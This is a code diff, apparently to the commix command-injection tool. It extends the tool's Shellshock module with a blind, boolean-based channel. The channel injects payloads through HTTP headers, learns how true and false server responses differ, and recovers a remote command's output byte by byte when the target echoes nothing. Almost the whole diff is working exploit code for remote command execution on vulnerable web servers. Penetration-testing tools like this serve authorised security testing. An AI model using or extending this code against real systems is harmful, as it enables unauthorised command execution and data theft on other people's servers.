@@ -282,6 +282,16 @@ def shellshock_handler(url, http_request_method, filename):
           session_handler.import_injection_points(url, technique, injection_type, filename, "", True, vuln_parameter, "", "", "", False, payload, http_request_method, 0, 0, 0, 0, settings.INJECTION_LEVEL)
 
       if found_this_header:
+        # Confirmed, but the target may hand nothing back. Where it does not, the page still says
+        # whether the script ran at all, which is answer enough to read the output a byte at a time.
+        # Asked with a tag made fresh for the run, so a page that merely repeats what it was given
+        # is not mistaken for one that handed back what the command printed.
+        probe_tag = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
+        if not settings.SHELLSHOCK_OOB and probe_tag not in (cmd_exec(url, "echo " + probe_tag, working_cve, check_header, filename) or ""):
+          if _boolean_usable(url, working_cve, check_header):
+            settings.SHELLSHOCK_BOOLEAN = True
+            info_msg = "The target returns nothing, so the output is read off the page it serves when the script does not run."
+            settings.print_data_to_stdout(settings.print_info_msg(info_msg))
         _post_exploitation(url, working_cve, check_header, filename, technique, no_result)
 
         # Asked once for the whole run, not once per header.
@@ -332,10 +342,84 @@ RESOLVED_CMD_PREFIX = {}
 """
 Execute user commands
 """
+"""
+Ask one yes/no question over the module's own injection point.
+
+A false answer leaves the shell before the script it was started for ever runs, so the answer is the
+difference between the page the target normally serves and the one it serves when there is none.
+"""
+def _boolean_page(url, cve, check_header, vector):
+  """
+  The page a question comes back with, error statuses included.
+
+  A false answer here leaves the shell before the script runs, so the server answers 500 and the
+  client raises rather than returning - which is the answer itself, not a failure to get one.
+  """
+  from src.core.controller import checks as _checks
+  try:
+    response = _send_header_payload(url, check_header, shellshock_payloads(cve, vector))
+  except _urllib.error.HTTPError as err_msg:
+    response = err_msg
+  except Exception:
+    return None, None
+  if response is None or isinstance(response, bool):
+    return None, None
+  try:
+    return _checks.process_page_content(response, action="decode"), response.getcode()
+  except Exception:
+    return None, None
+
+def _boolean_ask(url, cve, check_header, payload):
+  from src.core.controller import checks as _checks
+  # The module's own wrapper already ends in a separator, so the payload must not open with one.
+  vector = payload.strip(settings.END_LINE.LF).strip(";") + " || exit"
+  page, code = _boolean_page(url, cve, check_header, vector)
+  if page is None:
+    return None
+  return _checks.boolean_oracle(page, code)
+
+"""
+Learn what a yes and a no look like here, from two questions whose answers are known.
+"""
+def _boolean_usable(url, cve, check_header):
+  from src.core.controller import checks as _checks
+  from src.core.techniques.boolean_based import bb_payloads as payloads
+  # This module reads its answer off a bash that never started, so the question is asked bare - a
+  # payload that printed a marker would be printing it from the shell this one aborts.
+  settings.BOOLEAN_PRINTED_STATE = False
+  TAG = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
+
+  def page_for(holds):
+    vector = payloads.decision(";", TAG, len(TAG), holds=holds).strip(";") + " || exit"
+    return _boolean_page(url, cve, check_header, vector)[0]
+
+  return _checks.calibrate_boolean_oracle(page_for(True), page_for(False))
+
+"""
+Read a command's output a byte at a time, over the module's injection point.
+"""
+def _boolean_cmd_exec(url, cmd, cve, check_header):
+  from src.core.techniques.boolean_based import bb_handler as bb
+  from src.core.techniques.boolean_based import bb_payloads as payloads
+
+  settings.BOOLEAN_PRINTED_STATE = False
+
+  class _Channel(bb.Channel):
+    def __init__(self):
+      bb.Channel.__init__(self, ";", "", "", "", settings.HTTPMETHOD.GET, url, check_header)
+
+    def ask(self, payload):
+      return _boolean_ask(url, cve, check_header, payload)
+
+  return bb.retrieve(_Channel(), cmd)
+
 def cmd_exec(url, cmd, cve, check_header, filename):
 
   if settings.SHELLSHOCK_OOB:
     return _oob_cmd_exec(url, cmd, cve, check_header)
+
+  if settings.SHELLSHOCK_BOOLEAN:
+    return _boolean_cmd_exec(url, cmd, cve, check_header)
 
   """
   Check for shellshock 'shell'
